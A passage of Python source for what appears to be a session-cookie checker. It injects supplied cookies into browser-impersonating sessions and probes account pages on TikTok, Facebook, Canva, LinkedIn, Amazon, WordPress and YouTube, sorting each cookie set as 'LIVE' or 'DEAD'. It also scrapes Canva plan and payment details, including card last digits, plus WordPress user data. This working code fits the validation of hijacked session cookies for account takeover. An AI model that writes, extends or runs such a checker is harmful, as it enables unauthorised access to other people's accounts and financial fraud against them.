            'videos': stats.get('videos', '0'),
            'verified': stats.get('verified', 'false')
        }
        
    except Exception as e:
        return {
            'followers': '0',
            'following': '0',
            'likes': '0',
            'videos': '0',
            'verified': 'false'
        }

def test_tiktok_profile(cookies, username):
    try:
        import requests
        
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            
            cookie_name = str(cookie['name'])[:100]           
            cookie_value = str(cookie['value'])[:4000]             
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT
        }
        
        
        profile_url = f"https://www.tiktok.com/@{username}"
        response = session.get(profile_url, headers=headers, timeout=15, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200 and f'@{username}' in final_url:
            
            stats = extract_tiktok_profile_stats(response.text)
            return {
                'status': 'success',
                'stats': stats,
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'error',
                'message': f'Cannot access profile page: {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error accessing profile: {str(e)}'
        }

def test_facebook_login(cookies):
    
    try:
        session = requests.Session()
        

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]           
            cookie_value = str(cookie['value'])[:4000]             
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        facebook_url = "https://www.facebook.com/settings"
        response = session.get(facebook_url, headers=headers, timeout=15, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'facebook.com/settings' in final_url.lower():
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On settings page'
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings'
                }
        elif status_code == 400:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Invalid or expired cookies',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - Facebook rejected cookies'
            }
        else:
            return {
                'status': 'error',
                'message': f'HTTP error: {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Facebook: {str(e)}'
        }

def check_facebook_cookies_complete(cookies):
    try:
       
        required_cookies = ['c_user', 'xs', 'datr', 'fr', 'sb']
        
       
        cookie_names = [cookie['name'] for cookie in cookies]
        
       
        missing_cookies = []
        for required in required_cookies:
            if required not in cookie_names:
                missing_cookies.append(required)
        
        if not missing_cookies:
            return "Status: Complete Cookies - LIVE"
        else:
            return f"Status: Missing cookies - {', '.join(missing_cookies)}"
        
    except Exception as e:
        return f"Status: Error when checking - {str(e)}"

def extract_canva_plan(html_content):
   
    try:
        import re
        
        
        
       
        auto_plan_patterns = [
            r'<h4[^>]*class="[^"]*"[^>]*>([^<]+)</h4>',
           
            r'<h[1-6][^>]*>([^<]*(?:plan|subscription|tier|account|membership|miễn phí|gratis|free|pro|premium|đội nhóm|teams?|business|doanh nghiệp|gratuito|profesional|equipo|empresa|gratuit|professionnel|équipe|entreprise|kostenlos|professionell|mannschaft|unternehmen|professionale|squadra|azienda|無料|プロ|チーム|ビジネス|免费|专业|团队|企业|무료|프로|팀|비즈니스|professioneel|bedrijf|бесплатно|профессиональный|команда|бизнес|ฟรี|โปร|ทีม|ธุรกิจ|مجاني|محترف|فريق|أعمال)[^<]*)</h[1-6]>',
           
            r'<div[^>]*class="[^"]*plan[^"]*"[^>]*>([^<]+)</div>',
            r'<div[^>]*class="[^"]*subscription[^"]*"[^>]*>([^<]+)</div>',
        ]
        
        detected_plans = []
        
        for pattern in auto_plan_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                plan_text = match.strip()
               
                if len(plan_text) > 3 and len(plan_text) < 50: 
                    
                    skip_words = ['button', 'menu', 'nav', 'header', 'footer', 'close', 'open', 'click', 'settings']
                    if not any(skip in plan_text.lower() for skip in skip_words):
                       
                        plan_indicators = [

                            'canva', 'pro', 'free', 'gratis', 'premium', 'basic', 'standard', 'business', 'enterprise', 'team', 'personal', 'individual',
                            
                            'miễn phí', 'đội nhóm', 'doanh nghiệp', 'cá nhân', 'chuyên nghiệp', 'cơ bản', 'nâng cao',

                            'gratuito', 'gratis', 'profesional', 'equipo', 'empresa', 'personal', 'básico', 'estándar', 'avanzado',
                            
                            'gratuit', 'professionnel', 'équipe', 'entreprise', 'personnel', 'basique', 'standard', 'avancé',

                            'kostenlos', 'professionell', 'mannschaft', 'unternehmen', 'persönlich', 'basis', 'erweitert',
                            'gratuito', 'profissional', 'equipe', 'empresa', 'pessoal', 'básico', 'padrão', 'avançado',
                            
                            'gratuito', 'professionale', 'squadra', 'azienda', 'personale', 'base', 'standard', 'avanzato',

                            '無料', 'プロ', 'チーム', 'ビジネス', '個人', 'ベーシック', 'スタンダード', 'プレミアム',
                            '免费', '专业', '团队', '企业', '个人', '基础', '标准', '高级',
                           
                            '무료', '프로', '팀', '비즈니스', '개인', '기본', '표준', '고급',
                           
                            'gratis', 'professioneel', 'team', 'bedrijf', 'persoonlijk', 'basis', 'standaard', 'geavanceerd',
                           
                            'бесплатно', 'профессиональный', 'команда', 'бизнес', 'личный', 'базовый', 'стандартный', 'продвинутый',
                           
                            'ฟรี', 'โปร', 'ทีม', 'ธุรกิจ', 'ส่วนบุคคล', 'พื้นฐาน', 'มาตรฐาน', 'ขั้นสูง',
                           
                            'مجاني', 'محترف', 'فريق', 'أعمال', 'شخصي', 'أساسي', 'قياسي', 'متقدم'
                        ]
                        if any(indicator in plan_text.lower() for indicator in plan_indicators):
                            detected_plans.append(plan_text)
        
       
        if detected_plans:
           
            best_plan = detected_plans[0]
            
           
            paid_indicators = [
                
                'pro', 'premium', 'business', 'enterprise', 'team', 'plus', 'advanced', 'standard',
               
                'đội nhóm', 'doanh nghiệp', 'chuyên nghiệp', 'nâng cao',

                'profesional', 'equipo', 'empresa', 'estándar', 'avanzado',
                
                'professionnel', 'équipe', 'entreprise', 'standard', 'avancé',

                'professionell', 'mannschaft', 'unternehmen', 'erweitert',
                'profissional', 'equipe', 'empresa', 'padrão', 'avançado',
               
                'professionale', 'squadra', 'azienda', 'standard', 'avanzato',
                
                'プロ', 'チーム', 'ビジネス', 'スタンダード', 'プレミアム',
                
                '专业', '团队', '企业', '标准', '高级',
                
                '프로', '팀', '비즈니스', '표준', '고급',
                
                'professioneel', 'team', 'bedrijf', 'standaard', 'geavanceerd',
                
                'профессиональный', 'команда', 'бизнес', 'стандартный', 'продвинутый',
                
                'โปร', 'ทีม', 'ธุรกิจ', 'มาตรฐาน', 'ขั้นสูง',
                
                'محترف', 'فريق', 'أعمال', 'قياسي', 'متقدم'
            ]
            free_indicators = [

                'free', 'gratis', 'basic', 'trial', 'personal', 'individual',
                
                'miễn phí', 'cơ bản', 'cá nhân',
                
                'gratuito', 'gratis', 'personal', 'básico',

                'gratuit', 'personnel', 'basique',
                
                'kostenlos', 'persönlich', 'basis',
                
                'gratuito', 'pessoal', 'básico',
                
                'gratuito', 'personale', 'base',
                
                '無料', '個人', 'ベーシック',
               
                '免费', '个人', '基础',
               
                '무료', '개인', '기본',
               
                'gratis', 'persoonlijk', 'basis',   
                'бесплатно', 'личный', 'базовый',
                'ฟรี', 'ส่วนบุคคล', 'พื้นฐาน',
                'مجاني', 'شخصي', 'أساسي'
            ]
            
            is_paid = any(paid in best_plan.lower() for paid in paid_indicators)
            is_free = any(free in best_plan.lower() for free in free_indicators)
            
            if is_paid or (not is_free and 'canva' in best_plan.lower()):
                
                payment_info = extract_payment_info(html_content)
                return f"Plan: {best_plan}{payment_info}"
            else:
                
                return f"Plan: {best_plan}"
        
        
        business_patterns = [
            r'<h[1-6][^>]*>([^<]*Teams?[^<]*)</h[1-6]>',
            r'<h[1-6][^>]*>([^<]*Business[^<]*)</h[1-6]>',
            r'<h[1-6][^>]*>([^<]*Enterprise[^<]*)</h[1-6]>',
            r'<div[^>]*>([^<]*Teams?[^<]*)</div>',
            r'<div[^>]*>([^<]*Business[^<]*)</div>',
        ]
        
        for pattern in business_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if match:
                plan_name = match.group(1).strip()
                payment_info = extract_payment_info(html_content)
                return f"Plan: {plan_name}{payment_info}"
        
        
        subscription_indicators = [
            r'subscription',
            r'plan',
            r'billing',
            r'payment',
            r'price',
            r'cost',
            r'upgrade',
            r'premium',
            r'monthly',
            r'annual',
            r'yearly',
        ]
        
        subscription_count = 0
        for indicator in subscription_indicators:
            if re.search(indicator, html_content, re.IGNORECASE):
                subscription_count += 1
        
        
        currency_patterns = [
            r'(\$\d+[\d.,]*)', 
            r'(€\d+[\d.,]*)',   
            r'(£\d+[\d.,]*)',   
            r'(¥\d+[\d.,]*)',   
            r'(\d+[\d.,]*\s*USD)', 
            r'(\d+[\d.,]*\s*EUR)', 
        ]
        
        found_price = None
        for pattern in currency_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                found_price = match.group(1).strip()
                break
        

        json_patterns = [
            r'"planType"[^"]*"[^"]*"([^"]*)"', 
            r'"subscription_type"[^"]*"[^"]*"([^"]*)"', 
            r'"tier"[^"]*"[^"]*"([^"]*)"', 
            r'data-plan[^=]*=[^"]*"([^"]*)"', 
        ]
        
        for pattern in json_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                plan_type = match.group(1).strip()
                if plan_type.lower() not in ['', 'null', 'undefined']:
                    price_info = f" | {found_price}" if found_price else ""
                    return f"Plan: {plan_type.title()}{price_info}"
        

        has_upgrade_button = bool(re.search(r'upgrade|improve|enhance', html_content, re.IGNORECASE))
        has_billing_info = subscription_count >= 3
        has_price = found_price is not None
        
        if has_price:
            return f"Plan: Paid Plan | {found_price}"
        elif has_upgrade_button and has_billing_info:
            return "Plan: Free (with upgrade options)"
        elif has_billing_info:
            return "Plan: Free (billing page accessed)"
        

        spa_result = extract_canva_plan_from_spa(html_content)
        if spa_result and "Unknown - SPA content" not in spa_result:
            return spa_result
        
        return "Plan: Unknown - Could not detect plan type"
        
    except Exception as e:
        return f"Plan: Error - {str(e)}"

def extract_payment_info(html_content):
    
    try:
        import re
        
        
        auto_payment_patterns = [
            
            r'([¥€£$₹¢₽₿]\d+[\d.,]*[^<]{0,15})', 
            r'(\d+[\d.,]*[^<]{0,5}[¥€£$₹¢₽₿][^<]{0,15})', 
            
            r'(\d+[\d.,]*\s*(?:USD|EUR|GBP|JPY|CNY|INR|CAD|AUD|CHF|SEK|NOK|DKK|PLN|CZK|HUF|BGN|RON|HRK|RUB|TRY|BRL|MXN|KRW|SGD|HKD|THB|VND|PHP|IDR|MYR)[^<]{0,15})',
            
            r'(\d+[^<]{0,15}(?:month|year|annual|monthly|yearly|tháng|năm|mese|año|mois|année|monat|jahr|månader|år|miesięcy|lat|měsíc|rok)[^<]{0,10})',
            
            r'((?:Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)\s*[•*·]{0,10}\s*\d{4})',
            
            r'(\d+(?:&nbsp;|\s)+[A-Z]{2,4}\$[^<]{0,15})', 
            r'(\d+(?:&nbsp;|\s)*[^<]{0,10}/(?:month|year|tháng|năm|mese|año)[^<]{0,10})', 
        ]
        
        
        all_payment_info = []
        
        for pattern in auto_payment_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                payment_info = match.strip()
                
                payment_info = payment_info.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
                
                if payment_info and len(payment_info) > 2:
                    
                    is_duplicate = False
                    for existing in all_payment_info:
                        if payment_info in existing or existing in payment_info:
                            
                            if len(payment_info) > len(existing):
                                all_payment_info.remove(existing)
                                all_payment_info.append(payment_info)
                            is_duplicate = True
                            break
                    if not is_duplicate:
                        all_payment_info.append(payment_info)
        
        
        if all_payment_info:
            return f" | {' · '.join(all_payment_info)}"
        
        return ""
        
    except Exception as e:
        return ""

def extract_canva_plan_from_spa(html_content):
    
    try:
        import re
        

        js_auto_patterns = [
            
            r'"[^"]*"[^"]*"([^"]*Canva\s+Pro[^"]{0,15})"', 
            r'"[^"]*"[^"]*"([^"]*Canva\s+(?:Teams?|Business|Enterprise|Đội nhóm|Doanh nghiệp|Equipo|Empresa|Équipe|Entreprise|Mannschaft|Unternehmen|Squadra|Azienda|チーム|ビジネス|团队|企业|팀|비즈니스|Team|Bedrijf|Команда|Бизнес|ทีม|ธุรกิจ|فريق|أعمال)[^"]{0,15})"',
            r'"[^"]*"[^"]*"([^"]*Canva\s+(?:Gratis|Free|Miễn phí|Gratuito|Gratuit|Kostenlos|Gratuito|無料|免费|무료|Бесплатно|ฟรี|مجاني)[^"]{0,15})"',
            
            r'"subscription"[^}]*"[^"]*"[^"]*"([^"]{5,30})"',
            r'"plan[^"]*"[^"]*"([^"]{3,30})"',
            r'"tier[^"]*"[^"]*"([^"]{3,30})"',
            r'"account[^"]*"[^"]*"([^"]{3,30})"',
            r'"membership[^"]*"[^"]*"([^"]{3,30})"',
            
            r'"[^"]*"[^"]*"([^"]*Canva[^"]{0,20})"',
        ]
        
        detected_js_plans = []
        
        for pattern in js_auto_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                plan_text = match.strip()
                
                if 3 <= len(plan_text) <= 50:
                    
                    skip_js = ['true', 'false', 'null', 'undefined', 'http', 'www', '.com', '.js', '.css', 'function', 'var', 'const']
                    if not any(skip in plan_text.lower() for skip in skip_js):
                        
                        plan_indicators = [

                            'canva', 'pro', 'free', 'gratis', 'premium', 'basic', 'business', 'enterprise', 'team', 'personal', 'plus', 'standard', 'advanced',
                            
                            'miễn phí', 'đội nhóm', 'doanh nghiệp', 'cá nhân', 'chuyên nghiệp', 'cơ bản', 'nâng cao',
                            
                            'gratuito', 'profesional', 'equipo', 'empresa', 'personal', 'básico', 'estándar', 'avanzado',
                            
                            'gratuit', 'professionnel', 'équipe', 'entreprise', 'personnel', 'basique', 'avancé',
                            
                            'kostenlos', 'professionell', 'mannschaft', 'unternehmen', 'persönlich', 'basis', 'erweitert',
                            
                            'gratuito', 'profissional', 'equipe', 'empresa', 'pessoal', 'básico', 'padrão', 'avançado',
                            
                            'gratuito', 'professionale', 'squadra', 'azienda', 'personale', 'base', 'avanzato',
                            
                            '無料', 'プロ', 'チーム', 'ビジネス', '個人', 'ベーシック', 'スタンダード', 'プレミアム',
                            
                            '免费', '专业', '团队', '企业', '个人', '基础', '标准', '高级',
                            
                            '무료', '프로', '팀', '비즈니스', '개인', '기본', '표준', '고급',
                            
                            'gratis', 'professioneel', 'team', 'bedrijf', 'persoonlijk', 'basis', 'standaard', 'geavanceerd',
                            
                            'бесплатно', 'профессиональный', 'команда', 'бизнес', 'личный', 'базовый', 'стандартный', 'продвинутый',
                            
                            'ฟรี', 'โปร', 'ทีม', 'ธุรกิจ', 'ส่วนบุคคล', 'พื้นฐาน', 'มาตรฐาน', 'ขั้นสูง',
                            
                            'مجاني', 'محترف', 'فريق', 'أعمال', 'شخصي', 'أساسي', 'قياسي', 'متقدم'
                        ]
                        if any(indicator in plan_text.lower() for indicator in plan_indicators):
                            detected_js_plans.append(plan_text)
        

        if detected_js_plans:
            
            canva_plans = [p for p in detected_js_plans if 'canva' in p.lower()]
            best_js_plan = canva_plans[0] if canva_plans else detected_js_plans[0]
            
            
            plan_name = best_js_plan.strip()
            plan_name = plan_name.replace('\\\\', '').replace('\\', '').strip()
            
            plan_name = re.sub(r'\s+(Oct|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Nov|Dec)\s+\d{4}\s+Pricing.*', '', plan_name, flags=re.IGNORECASE)

            if 'canva' in plan_name.lower():
                
                core_indicators = ['pro', 'gratis', 'free', 'premium', 'business', 'enterprise', 'teams?', 'basic', 'standard', 'advanced', 'plus']
                for indicator in core_indicators:
                    pattern = rf'(Canva\s+{indicator})'
                    core_match = re.search(pattern, plan_name, re.IGNORECASE)
                    if core_match:
                        plan_name = core_match.group(1).strip()
                        break
            
            return f"Plan: {plan_name} (auto-detected from JS)"
        
        
        
        if '"subscription"' in html_content.lower() or '"billing"' in html_content.lower():
            return "Plan: Unknown - Billing/subscription data found but plan type not detected"
        
        
        if 'billing-and-teams' in html_content.lower() or 'settings' in html_content.lower():
            return "Plan: Likely Free - Billing page accessible but no paid plan detected"
        
        return "Plan: Unknown - SPA content requires JavaScript rendering"
        
    except Exception as e:
        return f"Plan: Error in SPA extraction - {str(e)}"

def test_canva_login(cookies):
    
    try:
        if not HAS_CURL_CFFI:
            
            return test_canva_login_fallback(cookies)
        
        
        session = crequests.Session(impersonate="chrome")
        
        
        session.headers.update({
            "User-Agent": CUSTOM_USER_AGENT,
        })
        

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        settings_url = "https://www.canva.com/settings/"
        response = session.get(settings_url, timeout=30, allow_redirects=True)
        
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis',
                'plan_info': 'Plan: Error - Response too large'
            }
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'canva.com/settings' in final_url.lower():
                
                plan_info = "Plan: Unknown - On settings page"
                
                try:
                    
                    billing_response = session.get("https://www.canva.com/settings/billing-and-teams", timeout=15)
                    if billing_response.status_code == 200 and 'billing-and-teams' in billing_response.url.lower():
                        plan_info = extract_canva_plan(billing_response.text)
                        if plan_info == "Plan: Unknown - Could not detect plan type":
                            plan_info = "Plan: Unknown - Billing page accessible but no plan detected"
                    else:
                        plan_info = "Plan: Unknown - Settings accessible but billing page not accessible"
                except Exception as e:
                    plan_info = "Plan: Unknown - Settings accessible but billing page error"
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings'
                }
        elif status_code == 403:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Access forbidden (403)',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - 403 Forbidden'
            }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Canva login: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_canva_login_fallback(cookies):
    
    try:
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT
        }
        
        
        settings_url = "https://www.canva.com/settings/"
        response = session.get(settings_url, headers=headers, timeout=15, allow_redirects=True)
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis (fallback)',
                'plan_info': 'Plan: Error - Response too large'
            }
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'canva.com/settings' in final_url.lower():
                
                plan_info = "Plan: Unknown - On settings page (fallback)"
                
                try:
                    
                    billing_response = session.get("https://www.canva.com/settings/billing-and-teams", headers=headers, timeout=15)
                    if billing_response.status_code == 200 and 'billing-and-teams' in billing_response.url.lower():
                        plan_info = extract_canva_plan(billing_response.text)
                        if plan_info == "Plan: Unknown - Could not detect plan type":
                            plan_info = "Plan: Unknown - Billing page accessible but no plan detected (fallback)"
                    else:
                        plan_info = "Plan: Unknown - Settings accessible but billing page not accessible (fallback)"
                except Exception as e:
                    plan_info = "Plan: Unknown - Settings accessible but billing page error (fallback)"
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page (fallback)',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings (fallback)',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings (fallback)'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code} (fallback)',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code} (fallback)'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Canva login (fallback): {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_linkedin_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.linkedin.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.linkedin.com/mypreferences/d/categories/account"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/uas/login' in redirect_location or '/login' in redirect_location:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        elif status_code == 200 and '/mypreferences/d/categories/account' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Account preferences accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing LinkedIn cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing LinkedIn login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_amazon_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.amazon.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.amazon.com/gp/your-account/order-history?ref_=ya_d_c_yo"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/signin' in redirect_location or '/ap/signin' in redirect_location or 'sign-in' in redirect_location:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to sign-in page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        elif status_code == 200 and '/gp/your-account/order-history' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Order history accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing Amazon cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing Amazon login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_wordpress_login(cookies):
    
    try:
        if HAS_CURL_CFFI:
            session = crequests.Session(impersonate="chrome")
        else:
            session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'], 
                cookie['value'], 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://wordpress.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        session.headers.update(headers)
        
        target_url = "https://wordpress.com/me/"
        response = session.get(target_url, timeout=30, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/log-in' in redirect_location or 'login' in redirect_location.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        
        
        response = session.get(target_url, timeout=30, allow_redirects=True)
        final_url = response.url
        content = response.text
        
        
        authenticated_patterns = [
            r'data-user-id="(\d+)"',
            r'"user_id":(\d+)',
            r'"username":"([^"]+)"',
            r'"display_name":"([^"]+)"',
            r'class="[^"]*account[^"]*settings[^"]*"',
            r'My Sites',
            r'Account Settings',
        ]
        
        auth_found = []
        user_data = {}
        
        for pattern in authenticated_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                auth_found.append((pattern, matches[0] if isinstance(matches[0], str) else str(matches[0])))
                if 'user_id' in pattern:
                    user_data['user_id'] = matches[0]
                elif 'username' in pattern:
                    user_data['username'] = matches[0]
                elif 'display_name' in pattern:
                    user_data['display_name'] = matches[0]
        
        login_prompts = [
            r'Sign up or log in',
            r'Log in to WordPress\.com',
            r'Create your account',
            r'class="[^"]*login-form[^"]*"',
            r'id="[^"]*login[^"]*"'
        ]
        
        login_found = []
        for pattern in login_prompts:
            if re.search(pattern, content, re.IGNORECASE):
                login_found.append(pattern)
        
        if user_data:
            user_info = ', '.join([f"{k}: {v}" for k, v in user_data.items()])
            return {
                'status': 'success',
                'message': f'Cookie LIVE - User authenticated ({user_info})',
                'final_url': final_url,
                'status_code': status_code,
                'user_data': user_data
            }
        elif auth_found and not login_found:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Authentication indicators found',
                'final_url': final_url,
                'status_code': status_code,
                'auth_indicators': len(auth_found)
            }
        elif login_found:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Login prompts detected',
                'final_url': final_url,
                'status_code': status_code,
                'login_prompts': len(login_found)
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unclear authentication status (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing WordPress cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing WordPress login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_youtube_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.youtube.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.youtube.com/account"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', 'Unknown')
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - Redirected to login (Status: {status_code})',
                'final_url': redirect_location,
                'status_code': status_code
            }
        elif status_code == 200 and '/account' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Account page accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
